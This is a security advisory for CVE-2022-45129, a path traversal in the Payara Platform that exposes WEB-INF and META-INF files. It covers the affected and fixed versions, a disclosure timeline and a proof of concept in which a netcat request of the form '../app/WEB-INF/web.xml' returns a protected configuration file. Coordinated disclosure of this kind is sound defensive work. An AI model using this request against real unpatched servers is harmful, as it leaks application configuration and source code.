@@ -1,0 +1,178 @@
+id: 38070
+date: 11/16/2022
+title: Payara Platform Path Traversal Vulnerability
+author: Michael Baer
+cves: CVE-2022-45129
+
+=======================================================================
+               title: Path Traversal Vulnerability
+             product: Payara Platform
+  vulnerable version: Enterprise: <5.45.0
+                      Community: <6.2022.1, <5.2022.4, <4.1.2.191.38
+       fixed version: Enterprise: 5.45.0
+                      Community: 6.2022.1, 5.2022.4, 4.1.2.191.38
+          CVE number: CVE-2022-45129
+              impact: High
+            homepage: https://www.payara.fish
+               found: 2022-09-29
+                  by: Michael Baer (Office Nuremberg)
+                      SEC Consult Vulnerability Lab
+
+                      An integrated part of SEC Consult, an Atos company
+                      Europe | Asia | North America
+
+                      https://www.sec-consult.com
+
+=======================================================================
+
+Vendor description:
+-------------------
+"Payara Micro Community is the open source, lightweight middleware platform of choice
+for containerized Jakarta EE application deployments. less than 70MB, Payara Micro
+requires no installation, configuration, or code rewrites."
+
+Source: https://www.payara.fish/products/payara-platform-community/
+
+
+Business recommendation:
+------------------------
+The vendor provides an update for the affected versions which should be installed
+immediately.
+
+SEC Consult highly recommends to perform a thorough security review of the
+Payara Software by security professionals to identify and resolve potential
+further security issues.
+
+
+Vulnerability overview/description:
+-----------------------------------
+1) Path Traversal Vulnerability (CVE-2022-45129)
+A path traversal similar to the old CVE-2021-41381 allows, under some circumstances,
+to bypass the protection of the WEB-INF/ and META-INF/ folders. It is possible to read
+files inside these directories of the deployed application. They mostly
+contain configuration files for the application but may also contain source code.
+
+
+Proof of concept:
+-----------------
+1) Path Traversal Vulnerability (CVE-2022-45129)
+a) (Setup)
+Deploy a web application at the root context (/). For this PoC,
+the following application was used: https://github.com/AKSarav/SampleWebApp
+===============================================================================
+java -jar ./appserver/extras/payara-micro/payara-micro-distribution/target/payara-micro.jar --port 1234 --deploy app.war --contextroot /
+===============================================================================
+This application uses the org.apache.catalina.servlets.DefaultServlet for serving files.
+The deployment at root (/) is crucial. The webapp has the following structure:
+.
+├── WEB-INF
+│   ├── web.xml
+│   └── weblogic.xml
+├── META-INF
+│   └── context.xml
+├── index.html
+└── welcome.jsp
+
+b) (Attack)
+The attacking payload is an HTTP request with a path starting with ../<webapp-name>/
+(note that it does not start with /). To issue this request, a netcat connection can
+be used:
+===============================================================================
+$ nc localhost 1234
+GET ../app/WEB-INF/web.xml HTTP/1.1
+Host: abc
+
+===============================================================================
+The server's response:
+===============================================================================
+HTTP/1.1 200 OK
+Server: Payara Micro #badassfish
+Accept-Ranges: bytes
+ETag: W/"688-1664529724289"
+Last-Modified: Fri, 30 Sep 2022 09:22:04 GMT
+Content-Type: application/xml
+Content-Length: 688
+X-Frame-Options: SAMEORIGIN
+
+<?xml version="1.0" encoding="UTF-8"?>
+[...]
+===============================================================================
+It is possible to access all files in the app's directory /app.
+The issue arises because the leading ../ is not detected to
+escape the context and later the code of StandardContextValve.java
+only checks the beginning of the path for forbidden directories
+/META-INF/ and /WEB-INF/.
+===============================================================================
+requestPath.toUpperCase().startsWith("/META-INF/", 0)
+===============================================================================
+
+
+Vulnerable / tested versions:
+-----------------------------
+The vulnerability has been found in version 5.2022.3 (using jdk8-openjdk 8.345.u01-1)
+and was verified as well on the Payara6 branch with the latest commit during the time
+of the test: e5f68cda7a72c0c15fb55b724fe5d2e1e6255510 (using jdk11-openjdk 11.0.16.1.u1-2).
+
+In both cases, the application was self-compiled from the official GitHub repository
+on an Arch Linux distribution.
+
+According to the vendor, "This vulnerability affects ALL the distributions of the
+Payara Platform (Server Full, Server Web, Micro, Embedded, Docker images)
+in every edition and major version.".
+
+The vulnerable versions are all before 6.2022.1, 4.1.2.191.38, 5.2022.4 (Community Edition)
+and 5.45.0 (Enterprise Edition).
+
+
+Vendor contact timeline:
+------------------------
+2022-10-05: Contacting vendor through security@payara.fish asking for encryption key.
+             Vendor agreed to proceed without encrypted channel.
+2022-10-06: Sent security advisory to vendor.
+2022-10-08: Vendor cannot reproduce vulnerability.
+2022-10-10: Sending additional / more detailed information.
+2022-10-12: Vendor confirms the vulnerability.
+2022-10-17: Contacting vendor to coordinate release date.
+2022-10-25: Vendor notifies that fix is applied and live in repository, we should wait
+             for marketing to put patch notes online.
+2022-11-02: Contacting vendor to ask for list of affected and fixed versions and CVE
+             number and whether marketing already sent out the information. No reply.
+2022-11-09: Identifying new version & patch notes are already available online.
+             Requesting CVE number through MITRE.
+2022-11-10: Sending CVE number to vendor
+2022-11-11: Informing vendor about public release date on 2022-11-14
+2022-11-14: Public release of security advisory.
+
+
+Solution:
+---------
+The vendor fixed the software to detect illegal path traversals.
+The fixed versions are
+* 6.2022.1 (Community Edition)
+* 5.2022.4 (Community Edition)
+* 4.1.2.191.38 (Community Edition)
+* 5.45.0 (Enterprise Edition)
+
+The Community Edition can be downloaded from the vendor's website:
+
+https://www.payara.fish/downloads/payara-platform-community-edition/
+
+The Enterprise Edition can be requested by the sales team of Payara.
+
+
+Further information regarding the vulnerability and releases can be
+found at the following web site of the vendor:
+
+https://blog.payara.fish/whats-new-in-the-november-2022-payara-platform-release
+
+
+Workaround:
+-----------
+None
+
+
+Advisory URL:
+-------------
+https://sec-consult.com/vulnerability-lab/
+
+#  0day.today [2023-03-22]  #
